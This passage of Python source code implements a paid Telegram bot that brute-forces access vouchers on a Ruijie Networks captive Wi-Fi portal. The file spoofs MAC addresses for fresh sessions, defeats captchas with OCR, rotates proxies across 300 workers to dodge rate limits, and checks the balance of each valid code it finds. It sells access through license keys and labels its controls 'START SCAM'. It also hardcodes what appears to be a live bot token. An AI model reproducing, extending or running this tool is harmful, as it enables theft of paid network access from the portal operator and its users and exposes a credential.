import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import hashlib
import datetime
import requests
import sqlite3
import base64
import uuid
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
from datetime import datetime, timedelta, timezone
from contextlib import contextmanager
import ddddocr
import cv2
import numpy as np

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

from aiohttp_socks import ProxyConnector, ProxyType

# ==================== CONFIGURATION ====================
BOT_TOKEN = "9107883692:AAFt6szeZgSqy9aAh8xpdFlmaPPwxWfcSc8"
SUPER_ADMIN_ID = 8702460710
ADMIN_IDS = [SUPER_ADMIN_ID]

TIMEOUT_SEC = 30
MAX_CODES_PER_SID = 999999
MAX_CODES_PER_SESSION = 999999
NUM_WORKERS = 300  # မြန်ဆန်စေရန် Worker အရေအတွက်ကို ၃၀၀ သို့ တိုးမြှင့်ထားသည်

PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"
DB_PATH = "bot_data.db"

# ==================== PREMIUM EMOJI IDS ====================
E_SCAN    = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
E_TARGET  = '<tg-emoji emoji-id="5328089410963513796">🏹</tg-emoji>'
E_CODE    = '<tg-emoji emoji-id="5332739932832146628">🎯</tg-emoji>'
E_FIRE    = '<tg-emoji emoji-id="5212932275376759608">🔥</tg-emoji>'
E_SWORD   = '<tg-emoji emoji-id="6116278319949288319">⚔️</tg-emoji>'
E_WARN    = '<tg-emoji emoji-id="5215557810359639942">⚠️</tg-emoji>'
E_PROXY   = '<tg-emoji emoji-id="5334680648164580850">🔀</tg-emoji>'
E_TICKET  = '<tg-emoji emoji-id="5418010521309815154">🎫</tg-emoji>'

E_SPARK   = '<tg-emoji emoji-id="6080071943212503588">✨</tg-emoji>'
E_USER    = '<tg-emoji emoji-id="5857159262194634073">👤</tg-emoji>'
E_ID      = '<tg-emoji emoji-id="5255835635704408236">🆔</tg-emoji>'
E_PARTY   = '<tg-emoji emoji-id="4956596167451346576">🎉</tg-emoji>'
E_CHECK   = '<tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>'
E_INF     = '<tg-emoji emoji-id="6080260479391896474">♾️</tg-emoji>'
E_REFRESH = '<tg-emoji emoji-id="6179402102838661361">🔄</tg-emoji>'

E_GLOBE   = '<tg-emoji emoji-id="5224450179368767019">🌐</tg-emoji>'
E_LINK    = '<tg-emoji emoji-id="5253577054137362120">🔗</tg-emoji>'
E_INBOX   = '<tg-emoji emoji-id="5443127283898405358">📥</tg-emoji>'
E_GREEN   = '<tg-emoji emoji-id="6298751564592973547">🟢</tg-emoji>'
E_RED     = '<tg-emoji emoji-id="6269223265001017592">🔴</tg-emoji>'
E_CLIP    = '<tg-emoji emoji-id="6300559565435963297">📋</tg-emoji>'
E_CROWN   = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
E_ROCKET  = '<tg-emoji emoji-id="5188481279963715781">🚀</tg-emoji>'
E_STOPEMJ = '<tg-emoji emoji-id="6271674836628541366">🛑</tg-emoji>'
E_DICE    = '<tg-emoji emoji-id="5971796410385829300">🎲</tg-emoji>'
E_KEY     = '<tg-emoji emoji-id="4967797089971995307">🔑</tg-emoji>'
E_NOTE    = '<tg-emoji emoji-id="5197269100878907942">📝</tg-emoji>'
E_MEGA    = '<tg-emoji emoji-id="5424818078833715060">📢</tg-emoji>'
E_CROSS   = '<tg-emoji emoji-id="6244410276859350931">❌</tg-emoji>'
E_HOUR    = '<tg-emoji emoji-id="5402117686320724687">⏳</tg-emoji>'

# ==================== DATABASE ====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY,
                  user_id TEXT,
                  plan TEXT,
                  expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000,
                  used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY,
                  key TEXT,
                  registered_at TEXT,
                  telegram_name TEXT,
                  telegram_username TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY,
                  proxy_enabled INTEGER DEFAULT 1)''')
    conn.commit()
    conn.close()

init_db()

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (str(user_id),))
        result = c.fetchone()
        if result:
            return bool(result[0])
    return True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (str(user_id), 1 if enabled else 0))

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key.strip(),))
        row = c.fetchone()
        if row:
            return dict(row)
    return None

def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (str(user_id),))
        row = c.fetchone()
        if row:
            return dict(row)
    return None

def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key.strip(),))
        row = c.fetchone()
        if row:
            return dict(row)
    return None

def db_add_user(user_id, key, telegram_name="", telegram_username=""):
    with get_db_cursor() as c:
        c.execute(
            "INSERT OR REPLACE INTO users (user_id, key, registered_at, telegram_name, telegram_username) VALUES (?, ?, ?, ?, ?)",
            (str(user_id), key, datetime.now(timezone.utc).isoformat(), telegram_name, telegram_username)
        )

def db_add_key(key, user_id, plan, expires_at, code_limit=1000):
    with get_db_cursor() as c:
        c.execute(
            "INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, 0)",
            (key, str(user_id), plan, expires_at, code_limit)
        )

def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))
        c.execute("DELETE FROM users WHERE key = ?", (key,))

def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        rows = c.fetchall()
        return {row['key']: dict(row) for row in rows}

def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users")
        return [dict(row) for row in c.fetchall()]

def db_increment_used_codes(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT key FROM users WHERE user_id = ?", (str(user_id),))
        row = c.fetchone()
        if row:
            c.execute("UPDATE keys SET used_codes = used_codes + 1 WHERE key = ?", (row[0],))

def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def check_key_expiration(expiration_time):
    try:
        if not expiration_time:
            return False
        ts = str(expiration_time).strip()
        if ts in ("9999-12-31T23:59:59Z", "unlimited", "Unlimited"):
            return True
        if "T" in ts:
            try:
                expiry = datetime.fromisoformat(ts.replace("Z", "+00:00"))
            except ValueError:
                try:
                    expiry = datetime.strptime(ts[:19], "%Y-%m-%dT%H:%M:%S")
                    expiry = expiry.replace(tzinfo=timezone.utc)
                except ValueError:
                    return False
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            return datetime.now(timezone.utc) < expiry
        return False
    except Exception as e:
        print(f"[check_key_expiration] error: {e} | value: {expiration_time}")
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1), "2d": timedelta(days=2), "3d": timedelta(days=3),
        "4d": timedelta(days=4), "5d": timedelta(days=5), "6d": timedelta(days=6),
        "7d": timedelta(days=7), "8d": timedelta(days=8), "9d": timedelta(days=9),
        "10d": timedelta(days=10), "11d": timedelta(days=11), "12d": timedelta(days=12),
        "13d": timedelta(days=13), "14d": timedelta(days=14), "15d": timedelta(days=15),
        "16d": timedelta(days=16), "17d": timedelta(days=17), "18d": timedelta(days=18),
        "19d": timedelta(days=19), "20d": timedelta(days=20), "21d": timedelta(days=21),
        "22d": timedelta(days=22), "23d": timedelta(days=23), "24d": timedelta(days=24),
        "25d": timedelta(days=25), "26d": timedelta(days=26), "27d": timedelta(days=27),
        "28d": timedelta(days=28), "29d": timedelta(days=29), "30d": timedelta(days=30),
        "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def is_admin(user_id):
    return str(user_id) == str(SUPER_ADMIN_ID)

def is_user_authorized(user_id):
    if is_admin(user_id):
        return True, "admin"
    user_info = db_get_user(user_id)
    if not user_info:
        return False, "not_registered"
    key_info = db_get_key(user_info["key"])
    if not key_info:
        return False, "no_key"
    if not check_key_expiration(key_info["expires_at"]):
        return False, "expired"
    return True, "ok"

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str):
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception:
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")

    def reload(self):
        self.load()

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad

_proxy_manager = None

def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

# ==================== SCANNER LOGIC ====================
_ocr_instance = None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

user_scanners = {}

def apply_scan_mode(ud, mode):
    if mode == "6":
        ud['char_set'] = "0123456789"
        ud['code_len'] = 6
    elif mode == "7":
        ud['char_set'] = "0123456789"
        ud['code_len'] = 7
    elif mode == "8":
        ud['char_set'] = "0123456789"
        ud['code_len'] = 8
    elif mode == "9":
        ud['char_set'] = "0123456789"
        ud['code_len'] = 9
    elif mode == "ascii-lower6":
        ud['char_set'] = "abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 6
    elif mode == "ascii-lower7":
        ud['char_set'] = "abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 7
    elif mode == "ascii-lower8":
        ud['char_set'] = "abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 8
    elif mode == "mix6":
        ud['char_set'] = "0123456789abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 6
    elif mode == "mix7":
        ud['char_set'] = "0123456789abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 7
    elif mode == "mix8":
        ud['char_set'] = "0123456789abcdefghijklmnopqrstuvwxyz"
        ud['code_len'] = 8
    else:
        ud['char_set'] = "0123456789"
        ud['code_len'] = 6

def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            'mode': 'mix6',
            'char_set': '0123456789abcdefghijklmnopqrstuvwxyz',
            'code_len': 6,
            'start_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'all_tasks': [],
            'stats': {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'recheck_queue': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'menu_msg_id': None,
            'state': None,
            'file_sent_for_this_scan': False,
        }
    return user_scanners[user_id]

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None

async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return None, None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None

def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

async def _parse_balance_response(resp) -> str:
    if resp.status == 200:
        data = await resp.json()
        inner = data.get('result', data)
        profile_name = inner.get('profileName', 'Unknown')
        raw_minutes = inner.get('totalMinutes')
        if raw_minutes is None:
            raw_minutes = inner.get('remainingMinutes')
        if raw_minutes is None:
            raw_minutes = 'Unknown'
        totaltime = Minute_to_Hour(raw_minutes)
        return f'{E_CLIP} Plan: {profile_name} | {E_HOUR} Time: {totaltime}'
    return None

async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    if proxy:
        try:
            connector = create_connector_for_proxy(proxy)
            async with aiohttp.ClientSession(connector=connector) as s:
                async with s.get(url, headers=headers, timeout=10) as resp:
                    parsed = await _parse_balance_response(resp)
                    if parsed:
                        return parsed
        except Exception:
            pass

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=10) as resp:
                parsed = await _parse_balance_response(resp)
                if parsed:
                    return parsed
                return f'{E_WARN} HTTP {resp.status}'
    except Exception as e:
        return f'{E_WARN} {type(e).__name__}'

async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token, code, proxy_str)
    for item in ud['valid_codes']:
        if item['code'] == code:
            item['balance_str'] = balance_str
            break
    ud['recent_logs'].append(f'{E_CHECK} HIT: {code} | {balance_str}')
    ud['dash_update_event'].set()

async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        raise asyncio.CancelledError()
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    retry_count = 0
    while not ud['stop_event'].is_set():
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            await asyncio.sleep(0.005)
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue

                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()

                    if 'request limited' in l_text:
                        retry_count += 1
                        if retry_count < 3:
                            continue
                        return 'limit'

                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        if not any(item['code'] == code for item in ud['valid_codes']):
                            ud['valid_codes'].append({'code': code, 'balance_str': '...fetching...'})
                            try:
                                db_increment_used_codes(user_id)
                            except Exception:
                                pass
                        ud['dash_update_event'].set()
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        if token_match:
                            asyncio.create_task(check_balance(token_match.group(1), code, user_id, current_proxy))
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        return 'expired'
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud['stats']['limits'] += 1
                        if code not in ud['limit_codes']:
                            ud['limit_codes'].append(code)
                        ud['recent_logs'].append(f'{E_WARN} LIMIT: {code}')
                        return 'limit'
                    return 'failed'
        except asyncio.CancelledError:
            raise
        except Exception:
            return 'failed'
    return 'failed'

async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    while not ud['stop_event'].is_set():
        use_proxy = db_get_proxy_setting(user_id)
        
        if use_proxy:
            proxy = await pm.get_next()
            if proxy is None:
                await asyncio.sleep(0.5)
                continue
            proxy_connector = create_connector_for_proxy(proxy)
        else:
            proxy = None
            proxy_connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=proxy_connector, connector_owner=True) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0

            while not ud['stop_event'].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 3:
                            if use_proxy: await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.5)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0

                while not ud['stop_event'].is_set():
                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        random.shuffle(body_chars)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
                    if code not in ud['tried_codes']:
                        ud['tried_codes'].add(code)
                        break
                    await asyncio.sleep(0.0001)

                if ud['stop_event'].is_set():
                    break

                ud['CURRENT_CODE'] = code
                await check_single_access_code(session, code, current_session_id,
                                               login_url, captcha_base_url, verify_url,
                                               headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1

async def _cleanup_cancelled_task(task):
    try:
        await task
    except (asyncio.CancelledError, Exception):
        pass

async def send_success_file(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    if not ud['valid_codes']:
        return
    if ud.get('file_sent_for_this_scan'):
        return
    ud['file_sent_for_this_scan'] = True
    try:
        filename = f"success_{user_id}_{int(time.time())}.txt"
        content = "\n\n".join([f"🎫 {item['code']}\n   {item.get('balance_str', '...')}" for item in ud['valid_codes']])
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)
        with open(filename, "rb") as f:
            await context.bot.send_document(
                chat_id=user_id,
                document=f,
                caption=f"✅ Scan ရပ်သွားပါပြီ။ ရရှိထားတဲ့ Success Codes {len(ud['valid_codes'])} ခုကို ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။"
            )
        if os.path.exists(filename):
            os.remove(filename)
    except Exception as e:
        print(f"[send_success_file] Error: {e}")

# ==================== HIT LIST HELPER ====================
def format_hit_list(valid_codes):
    if not valid_codes:
        return "None yet"
    lines = []
    for item in valid_codes:
        lines.append(f'{E_TICKET} {item["code"]}\n   {item.get("balance_str", "...")}')
    return "\n\n".join(lines)

# ==================== LIVE DASHBOARD ====================
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.5)
            continue
        try:
            stats = ud['stats']
            elapsed = time.time() - stats['start_time']
            speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
            proxy_total, proxy_active = pm.stats()

            hit_str = format_hit_list(ud['valid_codes'])

            text = (
                f'{E_SCAN} Scanner Running {E_SCAN}\n'
                f"Thank for using By Telegram @SAALRR\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f'{E_TARGET} Tried: {stats["tried"]:,}\n'
                f'{E_CODE} Current Code: {ud["CURRENT_CODE"]}\n'
                f'{E_FIRE} Hits: {stats["hits"]}\n'
                f'{E_SWORD} Expired: {stats["expired"]}\n'
                f'{E_WARN} Limits: {stats["limits"]}\n'
                f'{E_SCAN} Speed: {speed_cpm:.1f} c/m\n'
                f'{E_PROXY} Proxies: {proxy_active}/{proxy_total}\n'
                f"━━━━━━━━━━━━━━━━━━\n"
                f'{E_FIRE} <b>Hit Codes</b>:\n{hit_str}\n'
                f"━━━━━━━━━━━━━━━━━━\n"
            )
            if ud['recent_logs']:
                text += f'{E_FIRE} Last: {ud["recent_logs"][-1]}\n'

            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")]])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud['dash_msg_id'],
                text=text,
                reply_markup=keyboard,
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=2.0)
            ud['dash_update_event'].clear()
        except asyncio.TimeoutError:
            pass

async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    if pm.stats()[0] == 0:
        await context.bot.send_message(chat_id=user_id, text=f'{E_WARN} <b>No proxies loaded!</b>\n', parse_mode=ParseMode.HTML)

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    ud['dash_update_event'].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    for i in range(NUM_WORKERS):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    
    ud['all_tasks'] = tasks
    ud['task'] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        raise
    finally:
        try:
            await asyncio.shield(send_success_file(context, user_id))
        except asyncio.CancelledError:
            asyncio.create_task(send_success_file(context, user_id))
        except Exception as e:
            print(f"[run_user_scanner] success file error: {e}")

        ud['stop_event'].clear()
        ud['dash_msg_id'] = None
        ud['task'] = None
        ud['all_tasks'] = []

# ==================== KEYBOARDS ====================
def get_main_keyboard(user_id=None):
    keyboard = []
    proxy_enabled = db_get_proxy_setting(user_id) if user_id else True
    proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
    proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    
    keyboard.append([
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL", callback_data="menu_free_trial")
    ])
    
    if user_id and is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
            InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")
        ])
    else:
        keyboard.append([
            InlineKeyboardButton(proxy_text, callback_data=proxy_callback)
        ])
        
    keyboard.append([
        InlineKeyboardButton("📋 Success Codes", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck", callback_data="menu_recheck")
    ])
    
    keyboard.append([
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop")
    ])
    
    if user_id and is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_back")])
        
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_back")])
    return InlineKeyboardMarkup(keyboard)

def get_voucher_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔢 Number 6", callback_data="scan_6"), InlineKeyboardButton("🔢 Number 7", callback_data="scan_7")],
        [InlineKeyboardButton("🔢 Number 8", callback_data="scan_8"), InlineKeyboardButton("🔢 Number 9", callback_data="scan_9")],
        [InlineKeyboardButton("🔤 ascii-lower6", callback_data="scan_ascii-lower6"),
 InlineKeyboardButton("🔤 ascii-lower7", callback_data="scan_ascii-lower7")],
        [InlineKeyboardButton("🔤 ascii-lower8", callback_data="scan_ascii-lower8")],
        [InlineKeyboardButton("🔤+🔢 Mix 6", callback_data="scan_mix6"), InlineKeyboardButton("🔤+🔢 Mix 7", callback_data="scan_mix7")],
        [InlineKeyboardButton("🔤+🔢 Mix 8", callback_data="scan_mix8")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_digit_keyboard(mode):
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard = [buttons[i:i+5] for i in range(0, len(buttons), 5)]
    keyboard.append([InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_back")])
    return InlineKeyboardMarkup(keyboard)

def get_start_scam_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_back")]
    ])

def get_paid_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_back")]
    ])

def get_scam_button_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_back")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_back")]])

def get_admin_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"), InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey")],
        [InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"), InlineKeyboardButton("👥 Users List", callback_data="admin_users")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_back")]
    ])

def get_admin_genkey_keyboard():
    plans = [
        "1h",
        "1d", "2d", "3d", "4d", "5d", "6d", "7d", "8d", "9d", "10d",
        "11d", "12d", "13d", "14d", "15d", "16d", "17d", "18d", "19d", "20d",
        "21d", "22d", "23d", "24d", "25d", "26d", "27d", "28d", "29d", "30d",
        "unlimited"
    ]
    buttons = [InlineKeyboardButton(p, callback_data=f"admin_gen_{p}") for p in plans]
    keyboard = [buttons[i:i+5] for i in range(0, len(buttons), 5)]
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_back")])
    return InlineKeyboardMarkup(keyboard)

def get_admin_limit_keyboard(plan):
    limits = [100, 500, 1000, 5000, 10000]
